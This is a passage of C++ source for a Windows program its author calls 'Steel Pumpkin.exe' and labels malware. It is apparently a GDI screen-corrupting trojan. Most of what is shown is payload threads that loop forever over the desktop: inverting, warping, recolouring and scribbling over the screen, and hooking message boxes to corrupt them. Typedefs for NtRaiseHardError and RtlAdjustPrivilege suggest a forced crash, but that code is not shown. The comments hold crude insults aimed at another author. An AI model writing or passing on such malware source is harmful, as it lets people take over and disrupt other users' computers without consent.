﻿// Steel Pumpkin.cpp : 定义应用程序的入口点。
//
//Steel Pumpkin.exe: The longest malware of pvzrh icon virus.
// btw mazeicon a.k.a mazelarper no skid no ai pls
//

#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include <tchar.h>
#include <ctime>
#include <cmath>
#define PI 3.1415926535897932384626433832795028841971
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define SteelPumpkinRGB (RGB(134, 133, 133))
#define RGBBRUSH (DWORD)0x1900ac010e
#define SRCBRUSH (DWORD)0x89345c
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define DESKTOP_WINDOW ((HWND)0)
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
using namespace std;
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
typedef union ColorTemp {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *ColorTemps;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
VOID WINAPI MsgBoxCorruptionThread(HWND hwndMsgBox) {
	HDC hdc = GetDC(hwndMsgBox);
	RECT rect;
	GetWindowRect(hwndMsgBox, &rect);
	int w = rect.right - rect.left, h = rect.bottom - rect.top;
	double angle = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 5, 0 };
	while (true)
	{
		int w = rect.right - rect.left, h = rect.bottom - rect.top;
		HDC hdc = GetDC(hwndMsgBox), hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int nindazhidazhidadazhi = 0; nindazhidazhidadazhi < 10; nindazhidazhidadazhi++) {
			HBRUSH hBrush = CreateSolidBrush(SteelPumpkinRGB);
			HPEN pen = CreatePen(PS_NULL, NULL, NULL);
			SelectObject(hcdc, hBrush);
			SelectObject(hcdc, pen);
			Rectangle(hcdc, 0, 0, w, h);
			DeleteObject(hBrush);
			DeleteObject(pen);
			GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
			Sleep(250);
		}
		Sleep(250);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
	}
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		HWND hwndMsgBox = (HWND)wParam;
		ShowWindow(hwndMsgBox, 5);
		HANDLE handle = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MsgBoxCorruptionThread, hwndMsgBox, 0, NULL);
		return 0;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
BOOL FilterBltEx(HDC hdc, int x, int y, int width, int height, COLORREF(*Filter)(COLORREF, int, int)) {
	if (!hdc || width <= 0 || height <= 0 || x < 0 || y < 0 || !Filter) {
		return FALSE;
	}
	HDC memDC = CreateCompatibleDC(hdc);
	if (!memDC) return FALSE;
	HBITMAP hMemBmp = CreateCompatibleBitmap(hdc, width, height);
	if (!hMemBmp) {
		DeleteDC(memDC);
		return FALSE;
	}
	HBITMAP hOldBmp = (HBITMAP)SelectObject(memDC, hMemBmp);
	if (!hOldBmp) {
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	if (!BitBlt(memDC, 0, 0, width, height, hdc, x, y, SRCCOPY)) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BITMAPINFO bmi;
	ZeroMemory(&bmi, sizeof(bmi));
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = width;
	bmi.bmiHeader.biHeight = -height;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 24;
	bmi.bmiHeader.biCompression = BI_RGB;
	const DWORD rowBytes = ((width * 3 + 3) & ~3);
	BYTE* pPixels = (BYTE*)LocalAlloc(LPTR, rowBytes * height);
	if (!pPixels) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BOOL success = FALSE;
	if (GetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
		BYTE* pRow = pPixels;
		int actualY = y;
		for (int row = 0; row < height; ++row, pRow += rowBytes, actualY++) {
			BYTE* pPixel = pRow;
			int actualX = x;
			for (int col = 0; col < width; ++col, pPixel += 3, actualX++) {
				COLORREF original = RGB(pPixel[2], pPixel[1], pPixel[0]);  // BGR or RGB
				COLORREF filtered = Filter(original, actualX, actualY);
				pPixel[0] = GetBValue(filtered);
				pPixel[1] = GetGValue(filtered);
				pPixel[2] = GetRValue(filtered);
			}
		}
		if (SetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
			success = BitBlt(hdc, x, y, width, height, memDC, 0, 0, SRCCOPY);
		}
	}
	LocalFree(pPixels);
	SelectObject(memDC, hOldBmp);
	DeleteObject(hMemBmp);
	DeleteDC(memDC);
	return success;
}
DWORD WINAPI Payload5_num1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return ((t * (t >> 6 | t >> (t >> 167 & t >> 11)) / 65536));//Hatsunium.exe
			});
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI Payload1_num1(LPVOID lparam) {
	HDC hdc = GetDC(0), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, w, h, 1, 24 };
	PRGBTRIPLE rgbtriple;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / h, t = y ^ y | x;
			rgbtriple[i].rgbtRed -= ((GetRValue(i) >> (x ^ y)) + t);
			rgbtriple[i].rgbtGreen += ((GetGValue(i) & (x + y)) + t);
			rgbtriple[i].rgbtBlue ^= ((GetBValue(i) | (x / (y + 1))) + t);
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCINVERT);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload1_num2(LPVOID lparam) {//credits to N17Pro3426
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), mazelarper_s_dick_num = 0;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdcCopy, mazelarper_s_dick_num, 0, w, h, hdcCopy, 0, 0, NOTSRCCOPY);
		BitBlt(hdcCopy, mazelarper_s_dick_num - w, 0, w, h, hdcCopy, 0, 0, NOTSRCCOPY);
		BitBlt(hdcCopy, 0, 0, w, h, hdcCopy, 0, mazelarper_s_dick_num, NOTSRCCOPY);
		BitBlt(hdcCopy, 0, 0, w, h, hdcCopy, 0, mazelarper_s_dick_num - h, NOTSRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		mazelarper_s_dick_num = mazelarper_s_dick_num + 1;
		if (h <= mazelarper_s_dick_num) { mazelarper_s_dick_num = 0; }
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload2_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				double fx = x + (10 * atan(sinf((y + (i * 15)) / 100.f)) + (i * 10)) - ((x + log1pf((y + (i * 10)) / 50) * 1000) - (y + cosf((x - (i * 10)) / 50) * 1000)) / 3;
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				hslcolor.s = 1.f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0x00;
}
DWORD WINAPI Payload2_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	RECT wRect;
	POINT wPt[3];
	while (true)
	{
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 150;
		wPt[0].y = wRect.top + 25;
		wPt[1].x = wRect.right - 100;
		wPt[1].y = wRect.top - 50;
		wPt[2].x = wRect.left + 25;
		wPt[2].y = wRect.bottom - 100;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI Payload2_num3(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), radius = 114, angle = 0, count = 0, x = 10, y = 10, xx = 1, yy = 1, incrementor = 1;
	HICON hIcon = LoadIcon(GetModuleHandleA(0), MAKEINTRESOURCE(107));
	while (true) {
		hdc = GetDC(0);
		x += (incrementor * xx), y += (incrementor * yy);
		int xxx = x + (radius * cos(angle * PI / 8)), yyy = y + (radius * sin(angle * PI / 8));
		DrawIcon(hdc, x, y, hIcon);
		DrawIcon(hdc, xxx, yyy, hIcon);
		DestroyIcon(hIcon);
		if (y >= h) { yy = -1; }
		if (x >= w) { xx = -1; }
		if (y <= 0) { yy = 2; }
		if (x <= 0) { xx = 2; }
		angle++;
		if (count == 10) { count = 0; Sleep(1); }
		else { count++; }
		ReleaseDC(0, hdc);
	}
	DeleteObject(hIcon);
	return 0;
}
DWORD WINAPI Payload3_num1(LPVOID lparam) {//i have NO idea of this payload
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* pBits = NULL;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; ++y) {
			for (int x = 0; x < w; ++x) {
				int index = x ^ y * w;
				BYTE originalRed = pBits[index].rgbRed;
				BYTE originalGreen = pBits[index].rgbGreen;
				BYTE originalBlue = pBits[index].rgbBlue;
				BYTE fractalRed = ((x + y % 2) == 0) ? ((x | ~y) + (i * 8)) : ((~x & y) - (i * 8)) / 3;
				BYTE fractalGreen = (((x - i * 2) % 5) == 0) ? ((x >> ~y) - (~i * 8)) : ((~x ^ y) / ((i * 8) + 1)) / 6;
				BYTE fractalBlue = ((i * y % 2) == 0) ? ((x & ~y) * (i / 8)) : ((x | ~y) + (i * 8)) / 9;
				pBits[index].rgbRed = static_cast<BYTE>(2 * fractalRed);
				pBits[index].rgbGreen = static_cast<BYTE>(1 * fractalGreen + 1 * originalGreen);
				pBits[index].rgbBlue = static_cast<BYTE>(1.5 * fractalBlue + 0.5 * originalBlue);
				pBits[index].rgbRed = static_cast<BYTE>(pBits[index].rgbRed * 0.5);
				pBits[index].rgbGreen = static_cast<BYTE>((pBits[index].rgbGreen * 0.5));
				pBits[index].rgbBlue = static_cast<BYTE>(pBits[index].rgbBlue * 0.5);
				pBits[index].rgbRed = static_cast<BYTE>(0.5 * fractalBlue + 0.5 * fractalGreen);
				pBits[index].rgbGreen = static_cast<BYTE>(0.5 * fractalRed + 0.5 * fractalBlue);
				pBits[index].rgbBlue = static_cast<BYTE>(0.5 * fractalGreen + 0.5 * fractalRed);
			}
		}
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		i++;
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload4_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int fx = (int)((i ^ 4) + (i * 4) * cbrt((x >> (y | x)) * (y | x << y)) - ((x ^ y) | y ^ (x + y * i) >> 2));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				hslcolor.s = 1.005033f;
				hslcolor.l += 0.05033f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload4_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	RECT wRect;
	POINT wPt[3];
	while (true)
	{
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 15;
		wPt[0].y = wRect.top + 125;
		wPt[1].x = wRect.right - 10;
		wPt[1].y = wRect.top - 155;
		wPt[2].x = wRect.left - 125;
		wPt[2].y = wRect.bottom + 150;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI Payload6_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	double angle = 0.f;
	while (true)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int cx = (x - (w / 2));
				int cy = (y - (h / 2));
				int fx = (log2l((x + (i * 4)) ^ (y + (i * 4))) * 10) / 10;
				int fx1 = (cbrtf((x + (i * 4)) & (y + (i * 4))) * 10) / 12;
				int fx2 = (fabs((x + (i * 4)) | (y + (i * 4))) * 10) / 11;
				rgbquad[index].rgbRed -= fx - 16;
				rgbquad[index].rgbGreen *= fx1 + 32;
				rgbquad[index].rgbBlue += fx2;
			}
		}
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		i++;
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload7_num1(LPVOID lparam) {//stolen from mazelarper's shitty malware, modified by me
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), xSize = h / 3, ySize = 20;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < h * 2; i++) {
			int wave = atan(sinf(i / ((float)xSize) * PI)) * (ySize);
			BitBlt(hdcCopy, i, 0, 1, h, hdcCopy, i, wave, NOTSRCCOPY);
		}
		for (int i = 0; i < w * 2; i++) {
			int wave = acos(sqrtf(i / ((float)xSize) * PI)) * (ySize);
			BitBlt(hdcCopy, 0, i, w, 1, hdcCopy, wave, i, NOTSRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload7_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		POINT polygonP[999], bezierP[4] = { rand() % w, rand() % h, rand() % w, rand() % h,  rand() % w, rand() % h };
		int rndplgnnum = rand() % 10;
		for (int i = 0; i < rndplgnnum; i++) { polygonP[i].x = rand() % w, polygonP[i].y = rand() % h; }
		HPEN hpen = CreatePen(PS_SOLID, 9, RndRGB);
		SelectObject(hdc, hpen);
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		Polygon(hdc, polygonP, rndplgnnum);
		PolyBezier(hdc, bezierP, 4);
		ReleaseDC(NULL, hdc);
		DeleteObject(brush);
		DeleteObject(hpen);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI Payload8_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int fx = (int)((4 * i) + fabs((4 * i) * (x / 16.0)) + (4 * i) + ((4 * i) * sqrtl(y / 8.0)) + (4 * i) + round((4 * i) * ceil((x + y) / 16.0)) + (4 * i) + round((4 * i) * tan(cbrtf((double)(x * x + y * y)) / 8.0))) / 4 + ((i * 100) + (x * 2 % (1 + (x ^ y | x & y))));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		ReleaseDC(NULL, hdc);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload9_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int fx = (int)((i ^ 6) + (i * 8) * round(logbf(x ^ i + i + y & x + i * y ^ i)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod((float)fx / 400.f + y / (float)h * .2f, 1.f);
				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx * fx) / 15000.0 + 0.09, 1.0);
				hslcolor.s = 1.5033f;
				if (hslcolor.l < 1.5f) { hslcolor.l += .5f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload10_num1(LPVOID lparam) {//credits to camellia-y7x, but i modified it
	//btw original shader didn't released, and won't be released
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	BLENDFUNCTION blur = { AC_SRC_OVER, 0, 50, 0 };
